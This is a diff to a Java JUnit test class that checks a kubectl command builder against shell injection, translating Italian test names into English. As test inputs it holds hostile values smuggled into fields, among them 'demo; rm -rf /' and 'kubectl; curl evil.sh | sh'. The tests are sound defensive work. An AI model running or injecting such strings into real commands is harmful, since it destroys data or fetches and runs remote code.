@@ -6,13 +6,14 @@ import org.junit.jupiter.api.Test;
 import java.util.List;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
- * Queste stringhe finiscono dentro una shell remota. La validazione non e'
- * pignoleria: e' l'unica cosa che separa un file di configurazione da
- * un'esecuzione arbitraria di comandi sul jump host.
+ * These strings end up inside a remote shell. The validation is not fussiness:
+ * it is the only thing between a configuration file and arbitrary command
+ * execution on the jump host.
  */
 class KubectlCommandsTest {
 
@@ -24,65 +25,65 @@ class KubectlCommandsTest {
     }
 
     @Test
-    void costruisceIlComandoConIlNamespace() {
-        String command = commands("kubectl", "produzione", "").getPods();
+    void buildsTheCommandWithTheNamespace() {
+        String command = commands("kubectl", "production", "").getPods();
 
-        assertEquals("kubectl -n produzione get pods -o json", command);
+        assertEquals("kubectl -n production get pods -o json", command);
     }
 
     @Test
-    void includeIlContestoQuandoImpostato() {
+    void includesTheContextWhenSet() {
         String command = commands("kubectl", "demo", "cluster-a").getPods();
 
         assertTrue(command.contains("--context=cluster-a"), command);
     }
 
     @Test
-    void omettereIlContestoNonLasciaFlagVuoti() {
+    void omittingTheContextLeavesNoEmptyFlag() {
         String command = commands("kubectl", "demo", "  ").getPods();
 
-        assertTrue(!command.contains("--context"), command);
+        assertFalse(command.contains("--context"), command);
     }
 
     @Test
-    void accettaUnPercorsoCompletoPerIlBinario() {
+    void acceptsAFullPathForTheBinary() {
         String command = commands("/usr/local/bin/kubectl", "demo", "").getPods();
 
         assertTrue(command.startsWith("/usr/local/bin/kubectl "), command);
     }
 
     @Test
-    void rifiutaUnNamespaceCheProvaAIniettareComandi() {
+    void rejectsANamespaceTryingToInjectCommands() {
         assertThrows(IllegalArgumentException.class,
                 () -> commands("kubectl", "demo; rm -rf /", ""));
     }
 
     @Test
-    void rifiutaUnNamespaceConSpazi() {
+    void rejectsANamespaceWithSpaces() {
         assertThrows(IllegalArgumentException.class,
                 () -> commands("kubectl", "demo prod", ""));
     }
 
     @Test
-    void rifiutaUnNamespaceConApici() {
+    void rejectsANamespaceWithQuotes() {
         assertThrows(IllegalArgumentException.class,
                 () -> commands("kubectl", "demo\"$(whoami)\"", ""));
     }
 
     @Test
-    void rifiutaUnBinarioConMetacaratteriDiShell() {
+    void rejectsABinaryWithShellMetacharacters() {
         assertThrows(IllegalArgumentException.class,
                 () -> commands("kubectl; curl evil.sh | sh", "demo", ""));
     }
 
     @Test
-    void rifiutaValoriMancanti() {
+    void rejectsMissingValues() {
         assertThrows(IllegalArgumentException.class, () -> commands("kubectl", "", ""));
         assertThrows(IllegalArgumentException.class, () -> commands("", "demo", ""));
     }
 
     @Test
-    void rifiutaUnContestoNonValido() {
+    void rejectsAnInvalidContext() {
         assertThrows(IllegalArgumentException.class,
                 () -> commands("kubectl", "demo", "ctx && whoami"));
     }
